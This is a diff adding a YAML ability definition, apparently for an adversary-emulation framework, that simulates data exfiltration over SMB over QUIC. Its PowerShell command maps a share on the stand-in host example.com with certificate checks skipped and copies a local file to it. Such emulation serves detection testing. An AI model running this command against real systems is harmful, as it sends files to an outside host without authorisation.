@@ -1,0 +1,19 @@
+- description: "Simulates an attacker exfiltrating data over SMB over QUIC using the\
+    \ NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022\
+    \ Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center\n"
+  id: 5458332f-329c-896a-1339-82a7df20d358
+  name: Exfiltration Over SMB over QUIC (NET USE)
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy
+          'C:\path\to\file.txt' '*:\'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
